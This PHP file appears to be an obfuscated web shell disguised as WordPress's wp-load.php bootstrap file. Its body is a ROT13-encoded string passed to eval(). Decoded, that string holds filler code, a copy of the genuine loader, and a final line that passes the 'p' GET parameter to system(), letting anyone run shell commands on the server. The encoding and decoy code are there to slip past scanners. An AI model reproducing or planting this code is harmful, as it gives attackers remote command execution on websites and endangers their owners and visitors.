<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Obbgfgenc svyr sbe frggvat gur NOFCNGU pbafgnag
 * naq ybnqvat gur jc-pbasvt.cuc svyr. Gur jc-pbasvt.cuc
 * svyr jvyy gura ybnq gur jc-frggvatf.cuc svyr, juvpu
 * jvyy gura frg hc gur JbeqCerff raivebazrag.
 *
 * Vs gur jc-pbasvt.cuc svyr vf abg sbhaq gura na reebe
 * jvyy or qvfcynlrq nfxvat gur ivfvgbe gb frg hc gur
 * jc-pbasvt.cuc svyr.
 *
 * Jvyy nyfb frnepu sbe jc-pbasvt.cuc va JbeqCerff' cnerag
 * qverpgbel gb nyybj gur JbeqCerff qverpgbel gb erznva
 * hagbhpurq.
 *
 * @cnpxntr JbeqCerff
 */

/** Qrsvar NOFCNGU nf guvf svyr'f qverpgbel */
vs ( ! qrsvarq( 'NOFCNGU' ) ) {
	qrsvar( 'NOFCNGU', __QVE__ . '/' );
}

/*
 * Gur reebe_ercbegvat() shapgvba pna or qvfnoyrq va cuc.vav. Ba flfgrzf jurer gung vf gur pnfr,
 * vg'f orfg gb nqq n qhzzl shapgvba gb gur jc-pbasvt.cuc svyr, ohg nf guvf pnyy gb gur shapgvba
 * vf eha cevbe gb jc-pbasvt.cuc ybnqvat, vg vf jenccrq va n shapgvba_rkvfgf() purpx.
 */
vs ( shapgvba_rkvfgf( 'reebe_ercbegvat' ) ) {
	/*
	 * Vavgvnyvmr reebe ercbegvat gb n xabja frg bs yriryf.
	 *
	 * Guvf jvyy or nqncgrq va jc_qroht_zbqr() ybpngrq va jc-vapyhqrf/ybnq.cuc onfrq ba JC_QROHT.
	 * @frr uggcf://jjj.cuc.arg/znahny/ra/reebeshap.pbafgnagf.cuc Yvfg bs xabja reebe yriryf.
	 */
	reebe_ercbegvat( R_PBER_REEBE | R_PBER_JNEAVAT | R_PBZCVYR_REEBE | R_REEBE | R_JNEAVAT | R_CNEFR | R_HFRE_REEBE | R_HFRE_JNEAVAT | R_ERPBIRENOYR_REEBE );
}

/*
 * Vs jc-pbasvt.cuc rkvfgf va gur JbeqCerff ebbg, be vs vg rkvfgf va gur ebbg naq jc-frggvatf.cuc
 * qbrfa'g, ybnq jc-pbasvt.cuc. Gur frpbaqnel purpx sbe jc-frggvatf.cuc unf gur nqqrq orarsvg
 * bs nibvqvat pnfrf jurer gur pheerag qverpgbel vf n arfgrq vafgnyyngvba, r.t. / vf JbeqCerff(n)
 * naq /oybt/ vf JbeqCerff(o).
 *
 * Vs arvgure frg bs pbaqvgvbaf vf gehr, vavgvngr ybnqvat gur frghc cebprff.
 */
vs ( svyr_rkvfgf( NOFCNGU . 'jc-pbasvt.cuc' ) ) {

	/** Gur pbasvt svyr erfvqrf va NOFCNGU */
	erdhver_bapr NOFCNGU . 'jc-pbasvt.cuc';

} ryfrvs ( @svyr_rkvfgf( qveanzr( NOFCNGU ) . '/jc-pbasvt.cuc' ) && ! @svyr_rkvfgf( qveanzr( NOFCNGU ) . '/jc-frggvatf.cuc' ) ) {

	/** Gur pbasvt svyr erfvqrf bar yriry nobir NOFCNGU ohg vf abg cneg bs nabgure vafgnyyngvba */
	erdhver_bapr qveanzr( NOFCNGU ) . '/jc-pbasvt.cuc';

} ryfr {

	// N pbasvt svyr qbrfa'g rkvfg.

	qrsvar( 'JCVAP', 'jc-vapyhqrf' );
	erdhver_bapr NOFCNGU . JCVAP . '/irefvba.cuc';
	erdhver_bapr NOFCNGU . JCVAP . '/pbzcng.cuc';
	erdhver_bapr NOFCNGU . JCVAP . '/ybnq.cuc';

	// Purpx sbe gur erdhverq CUC irefvba naq sbe gur ZlFDY rkgrafvba be n qngnonfr qebc-va.
	jc_purpx_cuc_zlfdy_irefvbaf();

	// Fgnaqneqvmr $_FREIRE inevnoyrf npebff frghcf.
	jc_svk_freire_inef();

	qrsvar( 'JC_PBAGRAG_QVE', NOFCNGU . 'jc-pbagrag' );
	erdhver_bapr NOFCNGU . JCVAP . '/shapgvbaf.cuc';

	$cngu = jc_thrff_hey() . '/jc-nqzva/frghc-pbasvt.cuc';

	// Erqverpg gb frghc-pbasvt.cuc.
	vs ( ! fge_pbagnvaf( $_FREIRE['ERDHRFG_HEV'], 'frghc-pbasvt' ) ) {
		urnqre( 'Ybpngvba: ' . $cngu );
		rkvg;
	}

	jc_ybnq_genafyngvbaf_rneyl();

	// Qvr jvgu na reebe zrffntr.
	$qvr = '<c>' . fcevags(
		/* genafyngbef: %f: jc-pbasvt.cuc */
		__( \"Gurer qbrfa'g frrz gb or n %f svyr. Vg vf arrqrq orsber gur vafgnyyngvba pna pbagvahr.\" ),
		'<pbqr>jc-pbasvt.cuc</pbqr>'
	) . '</c>';
	$qvr .= '<c>' . fcevags(
		/* genafyngbef: 1: Qbphzragngvba HEY, 2: jc-pbasvt.cuc */
		__( 'Arrq zber uryc? <n uers=\"%1$f\">Ernq gur fhccbeg negvpyr ba %2$f</n>.' ),
		__( 'uggcf://qrirybcre.jbeqcerff.bet/nqinaprq-nqzvavfgengvba/jbeqcerff/jc-pbasvt/' ),
		'<pbqr>jc-pbasvt.cuc</pbqr>'
	) . '</c>';
	$qvr .= '<c>' . fcevags(
		/* genafyngbef: %f: jc-pbasvt.cuc */
		__( \"Lbh pna perngr n %f svyr guebhtu n jro vagresnpr, ohg guvf qbrfa'g jbex sbe nyy freire frghcf. Gur fnsrfg jnl vf gb znahnyyl perngr gur svyr.\" ),
		'<pbqr>jc-pbasvt.cuc</pbqr>'
	) . '</c>';
	$qvr .= '<c><n uers=\"' . $cngu . '\" pynff=\"ohggba ohggba-ynetr\">' . __( 'Perngr n Pbasvthengvba Svyr' ) . '</n></c>';

	jc_qvr( $qvr, __( 'JbeqCerff &efndhb; Reebe' ) );
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>